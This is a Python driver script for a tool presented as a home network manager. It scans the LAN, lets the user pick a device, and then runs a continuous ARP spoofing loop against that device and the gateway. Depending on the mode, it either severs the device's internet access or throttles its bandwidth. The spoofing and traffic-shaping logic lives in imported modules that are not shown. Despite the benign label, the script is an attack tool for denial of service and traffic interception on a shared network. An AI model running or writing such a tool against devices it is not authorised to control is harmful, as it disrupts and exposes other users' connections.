from core import scanner, spoof, shaper
import time
import sys

def main():
    print("=== NetNexus: Open Source Home Network Manager ===")
    
    # 1. Automatic Scanning
    devices = scanner.scan_network()
    print(f"\n[+] Found {len(devices)} devices:")
    for i, dev in enumerate(devices):
        print(f"[{i}] IP: {dev['ip']} | MAC: {dev['mac']}")

    # 2. User Input
    target_id = int(input("\n[?] Select Device ID: "))
    target = devices[target_id]
    gateway = scanner.get_gateway_ip()
    
    mode = input("[?] Choose mode (kill / limit): ").lower()

    try:
        if mode == "kill":
            shaper.set_ip_forwarding(False)
            print(f"[*] Internet connection severed for {target['ip']}")
        elif mode == "limit":
            speed = input("[?] Enter limit (kbps): ")
            shaper.set_ip_forwarding(True)
            shaper.apply_limit(target['ip'], "wlan0", speed) # Change wlan0 if needed
            print(f"[*] Speed limited to {speed}kbps for {target['ip']}")

        # 3. Start ARP Spoofing Loop
        print("[!] Running... Press CTRL+C to stop.")
        while True:
            spoof.send_spoof_packets(target['ip'], gateway)
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[!] Shutting down. Cleaning up network rules...")
        shaper.reset_network("wlan0")
        sys.exit()

if __name__ == "__main__":
    main()